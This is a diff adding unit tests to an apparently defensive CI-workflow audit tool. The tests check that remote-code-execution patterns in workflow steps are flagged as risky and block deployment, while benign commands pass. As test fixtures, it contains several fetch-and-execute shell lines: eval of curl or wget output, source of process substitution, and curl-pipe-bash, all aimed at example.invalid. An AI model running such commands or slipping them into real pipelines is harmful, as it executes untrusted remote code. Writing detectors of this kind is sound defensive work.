@@ -450,6 +450,87 @@ class RatchetTests(unittest.TestCase):
         self.write('jobs:\n  check:\n    steps:\n      - "run": "curl -fsSL https://example.invalid/i | bash"\n')
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
 
+    def test_eval_direct_download_substitution_is_remote_execution(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: eval \"$(curl -fsSL https://example.invalid/installer)\"\n"
+        )
+        result = mod.audit(self.repo, self.base, self.commit())
+        self.assertEqual(result.new_risky_workflows, 1)
+        self.assertFalse(result.deployment_authorized)
+
+    def test_eval_unquoted_wget_download_rejected(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: eval $(wget -qO- https://example.invalid/installer)\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_shell_source_process_substitution_curl_denied(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: source <(curl -fsSL https://example.invalid/installer)\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_shell_dot_process_substitution_wget_denied(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: . <(wget -qO- https://example.invalid/installer)\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_curl_download_then_source_same_file_denied(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: curl -fsSL -o local.sh https://example.invalid/i && source local.sh\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_wget_download_then_dot_same_file_denied(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: wget -qO local.sh https://example.invalid/i && . local.sh\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_source_different_file_does_not_match_downloaded_name(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: curl -o downloaded.sh https://example.invalid/i && source other.sh\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
+
+    def test_echo_remote_eval_text_does_not_invoke_eval(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: echo \"downloaded content\" && echo completed\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
+
+    def test_curl_download_then_read_only_display_remains_unflagged(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: curl -o downloaded.sh https://example.invalid/i && cat downloaded.sh\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
+
+    def test_legacy_eval_remote_risk_is_grandfathered_only_when_unchanged(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: eval \"$(curl -fsSL https://example.invalid/i)\"\n"
+        )
+        legacy = self.commit()
+        r = mod.audit(self.repo, legacy, legacy)
+        self.assertGreaterEqual(r.baseline_findings, 1)
+        self.assertEqual(r.new_risky_workflows, 0)
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: eval \"$(curl -fsSL https://example.invalid/i)\"\n"
+            "      - run: echo changed\n"
+        )
+        self.assertEqual(mod.audit(self.repo, legacy, self.commit()).new_risky_workflows, 1)
+
     def test_shell_command_substitution_curl_denied(self):
         self.write("jobs:\n  x:\n    steps:\n      - run: bash -c \"$(curl -fsSL https://example.invalid/install.sh)\"\n")
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
